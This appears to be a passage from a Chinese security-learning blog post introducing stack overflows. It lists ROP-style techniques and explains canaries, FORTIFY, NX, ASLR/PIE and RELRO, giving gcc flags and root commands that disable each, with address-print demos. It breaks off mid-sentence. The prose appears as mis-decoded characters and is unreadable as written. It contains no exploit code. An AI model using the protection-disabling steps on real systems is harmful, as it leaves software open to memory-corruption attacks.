    <content type="html"><![CDATA[<blockquote><p>å£°æ˜</p></blockquote><p>éƒ‘é‡å£°æ˜ï¼šæ–‡ä¸­æ‰€æ¶‰åŠçš„æŠ€æœ¯ã€æ€è·¯å’Œå·¥å…·ä»…ä¾›ä»¥å®‰å…¨ä¸ºç›®çš„çš„å­¦ä¹ äº¤æµä½¿ç”¨ï¼Œä»»ä½•äººä¸å¾—å°†å…¶ç”¨äºéæ³•ç”¨é€”ä»¥åŠç›ˆåˆ©ç­‰ç›®çš„ï¼Œå¦åˆ™åæœè‡ªè¡Œæ‰¿æ‹…ï¼</p><blockquote><p>å‰è¨€</p></blockquote><p>è®°å½•ä¸‹è‡ªå·±å­¦ä¹ å †æ ˆæº¢å‡ºçš„å†…å®¹ï¼Œè¿™ç¯‡å°±æ˜¯æ ˆæº¢å‡ºå…¥é—¨çš„ä¸œè¥¿ï¼Œä¹Ÿç®—æ˜¯æ ˆæº¢å‡ºæ€»ç»“çš„ä¸Šç¯‡ï¼Œç¼åˆæ€ªæ–‡ç« å¤§éƒ¨åˆ†éƒ½æ˜¯å‚è€ƒå„ä¸ªå¸ˆå‚…çš„æ–‡ç« ï¼Œåé¢è¿˜ä¼šæœ‰å †æº¢å‡ºã€‚å†™æ–‡ç« çš„åˆå¿ƒæ˜¯ä¸ºäº†æ€»ç»“æ¢³ç†ä¸‹è‡ªå·±çš„å­¦ä¹ è¿‡ç¨‹ã€‚</p><p><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/1.gif" alt="74CBF97F98866D946732450F281B1AD0"></p><blockquote><h3 id="æ ˆæº¢å‡ºåˆ©ç”¨æ–¹å¼"><a href="#æ ˆæº¢å‡ºåˆ©ç”¨æ–¹å¼" class="headerlink" title="æ ˆæº¢å‡ºåˆ©ç”¨æ–¹å¼"></a>æ ˆæº¢å‡ºåˆ©ç”¨æ–¹å¼</h3></blockquote><ul><li>ROPï¼ˆä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„ä¸€æ®µæŒ‡ä»¤<ul><li>ret2shellcodeï¼ˆä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘æº¢å‡ºæ•°æ®ä¸­çš„ä¸€æ®µæŒ‡ä»¤</li><li>ret2libcï¼ˆä¿®æ”¹è¿”å›åœ°å€ï¼Œè®©å…¶æŒ‡å‘å†…å­˜ä¸­å·²æœ‰çš„æŸä¸ªå‡½æ•°</li><li>BROP</li><li>ret2dl-resolve</li><li>SROP</li></ul></li></ul><blockquote><h3 id="å¸¸ç”¨ä¿æŠ¤æœºåˆ¶"><a href="#å¸¸ç”¨ä¿æŠ¤æœºåˆ¶" class="headerlink" title="å¸¸ç”¨ä¿æŠ¤æœºåˆ¶"></a>å¸¸ç”¨ä¿æŠ¤æœºåˆ¶</h3></blockquote><h4 id="CANNARYé‡‘ä¸é›€-æ ˆä¿æŠ¤-Stack-protect-æ ˆæº¢å‡ºä¿æŠ¤"><a href="#CANNARYé‡‘ä¸é›€-æ ˆä¿æŠ¤-Stack-protect-æ ˆæº¢å‡ºä¿æŠ¤" class="headerlink" title="CANNARYé‡‘ä¸é›€(æ ˆä¿æŠ¤)/Stack protect/æ ˆæº¢å‡ºä¿æŠ¤"></a><strong>CANNARYé‡‘ä¸é›€(æ ˆä¿æŠ¤)/Stack protect/æ ˆæº¢å‡ºä¿æŠ¤</strong></h4><p>æ ˆæº¢å‡ºä¿æŠ¤æ˜¯ä¸€ç§ç¼“å†²åŒºæº¢å‡ºæ”»å‡»ç¼“è§£æ‰‹æ®µï¼Œå½“å‡½æ•°å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºæ”»å‡»æ¼æ´æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥è¦†ç›–æ ˆä¸Šçš„è¿”å›åœ°å€æ¥è®©shellcodeèƒ½å¤Ÿå¾—åˆ°æ‰§è¡Œã€‚å½“å¯ç”¨æ ˆä¿æŠ¤åï¼Œå‡½æ•°å¼€å§‹æ‰§è¡Œçš„æ—¶å€™ä¼šå…ˆå¾€æ ˆé‡Œæ’å…¥cookieä¿¡æ¯ï¼Œå½“å‡½æ•°çœŸæ­£è¿”å›çš„æ—¶å€™ä¼šéªŒè¯cookieä¿¡æ¯æ˜¯å¦åˆæ³•ï¼Œå¦‚æœä¸åˆæ³•å°±åœæ­¢ç¨‹åºè¿è¡Œã€‚æ”»å‡»è€…åœ¨è¦†ç›–è¿”å›åœ°å€çš„æ—¶å€™å¾€å¾€ä¹Ÿä¼šå°†cookieä¿¡æ¯ç»™è¦†ç›–æ‰ï¼Œå¯¼è‡´æ ˆä¿æŠ¤æ£€æŸ¥å¤±è´¥è€Œé˜»æ­¢shellcodeçš„æ‰§è¡Œã€‚åœ¨Linuxä¸­æˆ‘ä»¬å°†cookieä¿¡æ¯ç§°ä¸ºcanaryã€‚</p><p>å› æ­¤åœ¨ç¼–è¯‘æ—¶å¯ä»¥æ§åˆ¶æ˜¯å¦å¼€å¯æ ˆä¿æŠ¤ä»¥åŠç¨‹åº¦ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                       <span class="comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸å¼€å¯Canaryä¿æŠ¤</span></span><br><span class="line">gcc -fno-stack-protector -o <span class="built_in">test</span> test.c  <span class="comment">#ç¦ç”¨æ ˆä¿æŠ¤</span></span><br><span class="line">gcc -fstack-protector -o <span class="built_in">test</span> test.c     <span class="comment">#å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸è¿‡åªä¸ºå±€éƒ¨å˜é‡ä¸­å«æœ‰ char æ•°ç»„çš„å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br><span class="line">gcc -fstack-protector-all -o <span class="built_in">test</span> test.c <span class="comment">#å¯ç”¨å †æ ˆä¿æŠ¤ï¼Œä¸ºæ‰€æœ‰å‡½æ•°æ’å…¥ä¿æŠ¤ä»£ç </span></span><br></pre></td></tr></table></figure><hr><h4 id="FORTIFY-è½»å¾®çš„æ£€æŸ¥"><a href="#FORTIFY-è½»å¾®çš„æ£€æŸ¥" class="headerlink" title="FORTIFY/è½»å¾®çš„æ£€æŸ¥"></a><strong>FORTIFY/è½»å¾®çš„æ£€æŸ¥</strong></h4><p>forityå…¶å®éå¸¸è½»å¾®çš„æ£€æŸ¥ï¼Œç”¨äºæ£€æŸ¥æ˜¯å¦å­˜åœ¨ç¼“å†²åŒºæº¢å‡ºçš„é”™è¯¯ã€‚é€‚ç”¨æƒ…å½¢æ˜¯ç¨‹åºé‡‡ç”¨å¤§é‡çš„å­—ç¬¦ä¸²æˆ–è€…å†…å­˜æ“ä½œå‡½æ•°ï¼Œå¦‚memcpyï¼Œmemsetï¼Œstpcpyï¼Œstrcpyï¼Œstrncpyï¼Œstrcatï¼Œstrncatï¼Œsprintfï¼Œsnprintfï¼Œvsprintfï¼Œvsnprintfï¼Œgetsä»¥åŠå®½å­—ç¬¦çš„å˜ä½“ã€‚</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                        <span class="comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œä¸ä¼šå¼€è¿™ä¸ªæ£€æŸ¥</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=1 -o <span class="built_in">test</span> test.c    <span class="comment">#è¾ƒå¼±çš„æ£€æŸ¥</span></span><br><span class="line">gcc -D_FORTIFY_SOURCE=2 -o <span class="built_in">test</span> test.c    <span class="comment">#è¾ƒå¼ºçš„æ£€æŸ¥</span></span><br></pre></td></tr></table></figure><hr><h4 id="NXï¼ˆDEPï¼‰"><a href="#NXï¼ˆDEPï¼‰" class="headerlink" title="NXï¼ˆDEPï¼‰"></a>NXï¼ˆDEPï¼‰</h4><p>NXå³No-eXecuteï¼ˆä¸å¯æ‰§è¡Œï¼‰çš„æ„æ€ï¼ŒNXï¼ˆDEPï¼‰çš„åŸºæœ¬åŸç†æ˜¯å°†æ•°æ®æ‰€åœ¨å†…å­˜é¡µæ ‡è¯†ä¸ºä¸å¯æ‰§è¡Œï¼Œå½“ç¨‹åºæº¢å‡ºæˆåŠŸè½¬å…¥shellcodeæ—¶ï¼Œç¨‹åºä¼šå°è¯•åœ¨æ•°æ®é¡µé¢ä¸Šæ‰§è¡ŒæŒ‡ä»¤ï¼Œæ­¤æ—¶CPUå°±ä¼šæŠ›å‡ºå¼‚å¸¸ï¼Œè€Œä¸æ˜¯å»æ‰§è¡Œæ¶æ„æŒ‡ä»¤ã€‚</p><p>å·¥ä½œåŸç†å¦‚å›¾ï¼š<br><img src="https://raw.staticdn.net/Ascotbe/Random-img/master/StackOverflow/2.png" alt="img"></p><p>gccç¼–è¯‘å™¨é»˜è®¤å¼€å¯äº†NXé€‰é¡¹ï¼Œå¦‚æœéœ€è¦å…³é—­NXé€‰é¡¹ï¼Œå¯ä»¥ç»™gccç¼–è¯‘å™¨æ·»åŠ -z execstackå‚æ•°ã€‚<br>ä¾‹å¦‚ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c                <span class="comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œå¼€å¯NXä¿æŠ¤</span></span><br><span class="line">gcc -z execstack -o <span class="built_in">test</span> test.c   <span class="comment">#ç¦ç”¨NXä¿æŠ¤</span></span><br><span class="line">gcc -z noexecstack -o <span class="built_in">test</span> test.c <span class="comment">#å¼€å¯NXä¿æŠ¤</span></span><br></pre></td></tr></table></figure><p>åœ¨Windowsä¸‹ï¼Œç±»ä¼¼çš„æ¦‚å¿µä¸ºDEPï¼ˆæ•°æ®æ‰§è¡Œä¿æŠ¤ï¼‰ï¼Œåœ¨æœ€æ–°ç‰ˆçš„Visual Studioä¸­é»˜è®¤å¼€å¯äº†DEPç¼–è¯‘é€‰é¡¹ã€‚</p><hr><h4 id="PIEï¼ˆASLRï¼‰"><a href="#PIEï¼ˆASLRï¼‰" class="headerlink" title="PIEï¼ˆASLRï¼‰"></a>PIEï¼ˆASLRï¼‰</h4><p>ä¸€èˆ¬æƒ…å†µä¸‹NXï¼ˆWindowså¹³å°ä¸Šç§°å…¶ä¸ºDEPï¼‰å’Œåœ°å€ç©ºé—´åˆ†å¸ƒéšæœºåŒ–ï¼ˆASLRï¼‰ä¼šåŒæ—¶å·¥ä½œã€‚</p><p><strong>å¦‚æœåªå¼€å¯ASLRçš„è¯ï¼Œæœ¬èº«äºŒè¿›åˆ¶ç¨‹åºæ˜¯ä¸æ”¯æŒéšæœºåŒ–åŠ è½½çš„ï¼Œæ‰€ä»¥å°±å‡ºç°äº†ret2pltã€GOTè¡¨åŠ«æŒã€åœ°å€çˆ†ç ´ç­‰</strong></p><p>å†…å­˜åœ°å€éšæœºåŒ–æœºåˆ¶ï¼ˆaddress space layout randomization)ï¼Œæœ‰ä»¥ä¸‹å››ç§æƒ…å†µ</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0 - è¡¨ç¤ºå…³é—­è¿›ç¨‹åœ°å€ç©ºé—´éšæœºåŒ–ã€‚</span><br><span class="line">1 - è¡¨ç¤ºå°†mmapçš„åŸºå€ï¼Œstackå’Œvdsoé¡µé¢éšæœºåŒ–ã€‚</span><br><span class="line">2 - è¡¨ç¤ºåœ¨1çš„åŸºç¡€ä¸Šå¢åŠ æ ˆï¼ˆheapï¼‰çš„éšæœºåŒ–ã€‚</span><br><span class="line">2+PIE - å…¨éƒ¨éšæœºåŒ–</span><br></pre></td></tr></table></figure><table><thead><tr><th>ASLR</th><th>Executable</th><th>PLT</th><th>Heap</th><th>Stack</th><th>Shared libraries</th></tr></thead><tbody><tr><td>0</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td></tr><tr><td>1</td><td>&#10008;</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2</td><td>&#10008;</td><td>&#10008;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr><tr><td>2+PIE</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td><td>&#10004;</td></tr></tbody></table><p>ä½¿ç”¨ä¸€ä¸ªç¨‹åºæ¥æ¼”ç¤ºä¸‹ä¸Šè¡¨çš„å†…å®¹</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//test.c</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;dlfcn.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> <span class="built_in">stack</span>;</span><br><span class="line"><span class="keyword">int</span> *heap = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">int</span>));</span><br><span class="line"><span class="keyword">void</span> *handle = dlopen(<span class="string">&quot;libc.so.6&quot;</span>, RTLD_NOW | RTLD_GLOBAL);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;executable: %p\n&quot;</span>, &amp;main);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;system@plt: %p\n&quot;</span>, &amp;system);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;heap: %p\n&quot;</span>, heap);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;stack: %p\n&quot;</span>, &amp;<span class="built_in">stack</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;libc: %p\n&quot;</span>, handle);</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(heap);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//gcc test.c -no-pie -fno-pie -ldl</span></span><br></pre></td></tr></table></figure><h5 id="æœªå¼€å¯ASLRå’ŒPIE"><a href="#æœªå¼€å¯ASLRå’ŒPIE" class="headerlink" title="æœªå¼€å¯ASLRå’ŒPIE"></a>æœªå¼€å¯ASLRå’ŒPIE</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 0 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7fffffffe014</span><br><span class="line">libc: 0x7ffff7fb3500</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„åœ°å€éƒ½ä¸å˜</p><h5 id="å¼€å¯ALSRæœªå¼€å¯PIE"><a href="#å¼€å¯ALSRæœªå¼€å¯PIE" class="headerlink" title="å¼€å¯ALSRæœªå¼€å¯PIE"></a>å¼€å¯ALSRæœªå¼€å¯PIE</h5><h6 id="éƒ¨åˆ†å¼€å¯æ—¶"><a href="#éƒ¨åˆ†å¼€å¯æ—¶" class="headerlink" title="éƒ¨åˆ†å¼€å¯æ—¶"></a>éƒ¨åˆ†å¼€å¯æ—¶</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 1 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffdde37ce04</span><br><span class="line">libc: 0x7f8ef1525500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x4052a0</span><br><span class="line">stack: 0x7ffcd375c374</span><br><span class="line">libc: 0x7f51c11fb500</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªæœ‰<strong>æ ˆ</strong>çš„åœ°å€å’Œ<strong>libc</strong>çš„åœ°å€å‘ç”Ÿäº†æ”¹å˜</p><h6 id="å®Œå…¨å¼€å¯æ—¶"><a href="#å®Œå…¨å¼€å¯æ—¶" class="headerlink" title="å®Œå…¨å¼€å¯æ—¶"></a>å®Œå…¨å¼€å¯æ—¶</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x15162a0</span><br><span class="line">stack: 0x7ffda4f34384</span><br><span class="line">libc: 0x7f615589b500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x4011d6</span><br><span class="line">system@plt: 0x4010b0</span><br><span class="line">heap: 0x5a22a0</span><br><span class="line">stack: 0x7ffe432fa664</span><br><span class="line">libc: 0x7f17a059f500</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°åªæœ‰<strong>æ ˆ</strong>ã€<strong>libc</strong>ã€<strong>å †</strong>çš„åœ°å€å‘ç”Ÿäº†æ”¹å˜ï¼Œä½†æ˜¯ç¨‹åºæœ¬èº«çš„<strong>PLT</strong>ä¸å˜</p><h5 id="å¼€å¯ALSRå’ŒPIE"><a href="#å¼€å¯ALSRå’ŒPIE" class="headerlink" title="å¼€å¯ALSRå’ŒPIE"></a>å¼€å¯ALSRå’ŒPIE</h5><p>GCCæ”¯æŒçš„PIEé€‰é¡¹å¦‚ä¸‹</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-fpic          <span class="comment">#ä¸ºå…±äº«åº“ç”Ÿæˆä½ç½®æ— å…³ä»£ç </span></span><br><span class="line">-pie           <span class="comment">#ç”ŸæˆåŠ¨æ€é“¾æ¥çš„ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šå¸¸éœ€è¦åŒæ—¶æŒ‡å®š-fpie</span></span><br><span class="line">-no-pie        <span class="comment">#ä¸ç”ŸæˆåŠ¨æ€é“¾æ¥çš„ä½ç½®æ— å…³å¯æ‰§è¡Œæ–‡ä»¶</span></span><br><span class="line">-fpie          <span class="comment">#ç±»ä¼¼äº-fpicï¼Œä½†ç”Ÿæˆçš„ä½ç½®æ— å…³ä»£ç åªèƒ½ç”¨äºå¯æ‰§è¡Œæ–‡ä»¶ï¼Œé€šå¸¸åŒæ—¶æŒ‡å®š-pie</span></span><br><span class="line">-fno-pie       <span class="comment">#ä¸ç”Ÿæˆä½ç½®æ— å…³ä»£ç </span></span><br></pre></td></tr></table></figure><p>é€šè¿‡<code>-pie -fpie</code>è¿›è¡Œç¼–è¯‘</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# echo 2 &gt; &#x2F;proc&#x2F;sys&#x2F;kernel&#x2F;randomize_va_space</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# gcc -pie -fpie test.c -ldl</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x5640b79d01c9</span><br><span class="line">system@plt: 0x7fa5361ca410</span><br><span class="line">heap: 0x5640b8a392a0</span><br><span class="line">stack: 0x7ffc036cac64</span><br><span class="line">libc: 0x7fa53636d500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# .&#x2F;a.out </span><br><span class="line">executable: 0x561760ad81c9</span><br><span class="line">system@plt: 0x7f509abd0410</span><br><span class="line">heap: 0x561760be32a0</span><br><span class="line">stack: 0x7ffe2f8a7694</span><br><span class="line">libc: 0x7f509ad73500</span><br><span class="line">root@ubuntu:&#x2F;home&#x2F;ascotbe&#x2F;Desktop&#x2F;Pwn# </span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°å…¨éƒ¨åœ°å€éƒ½éšæœºäº†</p><hr><h4 id="RELRO"><a href="#RELRO" class="headerlink" title="RELRO"></a>RELRO</h4><p>åœ¨Linuxç³»ç»Ÿå®‰å…¨é¢†åŸŸæ•°æ®å¯ä»¥å†™çš„å­˜å‚¨åŒºå°±ä¼šæ˜¯æ”»å‡»çš„ç›®æ ‡ï¼Œå°¤å…¶æ˜¯å­˜å‚¨å‡½æ•°æŒ‡é’ˆçš„åŒºåŸŸã€‚ æ‰€ä»¥åœ¨å®‰å…¨é˜²æŠ¤çš„è§’åº¦æ¥è¯´å°½é‡å‡å°‘å¯å†™çš„å­˜å‚¨åŒºåŸŸå¯¹å®‰å…¨ä¼šæœ‰æå¤§çš„å¥½å¤„.</p><p>GCC, GNU linkerä»¥åŠGlibc-dynamic linkerä¸€èµ·é…åˆå®ç°äº†ä¸€ç§å«åšrelroçš„æŠ€æœ¯: read only relocationã€‚å¤§æ¦‚å®ç°å°±æ˜¯ç”±linkeræŒ‡å®šbinaryçš„ä¸€å—ç»è¿‡dynamic linkerå¤„ç†è¿‡ relocationä¹‹åçš„åŒºåŸŸä¸ºåªè¯».</p><p>è®¾ç½®ç¬¦å·é‡å®šå‘è¡¨æ ¼ä¸ºåªè¯»æˆ–åœ¨ç¨‹åºå¯åŠ¨æ—¶å°±è§£æå¹¶ç»‘å®šæ‰€æœ‰åŠ¨æ€ç¬¦å·ï¼Œä»è€Œå‡å°‘å¯¹GOTï¼ˆGlobal Offset Tableï¼‰æ”»å‡»ã€‚RELROä¸ºâ€ Partial RELROâ€ï¼Œè¯´æ˜æˆ‘ä»¬å¯¹GOTè¡¨å…·æœ‰å†™æƒé™ã€‚</p><p>gccç¼–è¯‘ï¼š</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gcc -o <span class="built_in">test</span> test.c            <span class="comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œæ˜¯Partial RELRO</span></span><br><span class="line">gcc -z norelro -o <span class="built_in">test</span> test.c <span class="comment">#å…³é—­ï¼Œå³No RELRO</span></span><br><span class="line">gcc -z lazy -o <span class="built_in">test</span> test.c    <span class="comment">#éƒ¨åˆ†å¼€å¯ï¼Œå³Partial RELRO</span></span><br><span class="line">gcc -z now -o <span class="built_in">test</span> test.c     <span class="comment">#å…¨éƒ¨å¼€å¯</span></span><br></pre></td></tr></table></figure><hr><blockquote><h3 id="å¸¸è§æ¦‚å¿µ"><a href="#å¸¸è§æ¦‚å¿µ" class="headerlink" title="å¸¸è§æ¦‚å¿µ"></a>å¸¸è§æ¦‚å¿µ</h3></blockquote><h4 id="GOT"><a href="#GOT" class="headerlink" title="GOT"></a>GOT</h4><p>GOTï¼ˆGlobal Offset Tableï¼Œå…¨å±€åç§»è¡¨ï¼‰æ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå®šä½å…¨å±€å˜é‡å’Œå‡½æ•°çš„ä¸€ä¸ªè¡¨ã€‚</p><hr><h4 id="PLT"><a href="#PLT" class="headerlink" title="PLT"></a>PLT</h4><p>PLTï¼ˆProcedure Linkage Tableï¼Œè¿‡ç¨‹é“¾æ¥è¡¨ï¼‰æ˜¯Linux ELFæ–‡ä»¶ä¸­ç”¨äºå»¶è¿Ÿç»‘å®šçš„è¡¨ï¼Œå³å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®šã€‚</p><h5 id="å»¶è¿Ÿç»‘å®š"><a href="#å»¶è¿Ÿç»‘å®š" class="headerlink" title="å»¶è¿Ÿç»‘å®š"></a>å»¶è¿Ÿç»‘å®š</h5><p>æ‰€è°“å»¶è¿Ÿç»‘å®šï¼Œå°±æ˜¯å½“å‡½æ•°ç¬¬ä¸€æ¬¡è¢«è°ƒç”¨çš„æ—¶å€™æ‰è¿›è¡Œç»‘å®šï¼ˆåŒ…æ‹¬ç¬¦å·æŸ¥æ‰¾ã€é‡å®šä½ç­‰ï¼‰ï¼Œå¦‚æœå‡½æ•°ä»æ¥æ²¡æœ‰ç”¨åˆ°è¿‡å°±ä¸è¿›è¡Œç»‘å®šã€‚åŸºäºå»¶è¿Ÿç»‘å®šå¯ä»¥å¤§å¤§åŠ å¿«ç¨‹åºçš„å¯åŠ¨é€Ÿåº¦ï¼Œç‰¹åˆ«æœ‰åˆ©äºä¸€äº›å¼•ç”¨äº†å¤§é‡å‡½æ•°çš„ç¨‹åº</p><hr><h4 id="GOTå’ŒPLTçš„å…³ç³»"><a href="#GOTå’ŒPLTçš„å…³ç³»" class="headerlink" title="GOTå’ŒPLTçš„å…³ç³»"></a>GOTå’ŒPLTçš„å…³ç³»</h4><p>ELFä½¿ç”¨PLTï¼ˆProcedure linkage Table, è¿‡ç¨‹é“¾æ¥è¡¨)çš„æ–¹æ³•æ¥å®ç°ã€‚é€šå¸¸æˆ‘ä»¬è°ƒç”¨æŸä¸ªå¤–éƒ¨æ¨¡å—çš„å‡½æ•°æ—¶ï¼Œåº”è¯¥æ˜¯é€šè¿‡GOTä¸­ç›¸åº”çš„é¡¹è¿›è¡Œé—´æ¥è·³è½¬ã€‚è€ŒPLTä¸ºäº†å®ç°å»¶è¿Ÿç»‘å®šï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­æœ‰å¢åŠ 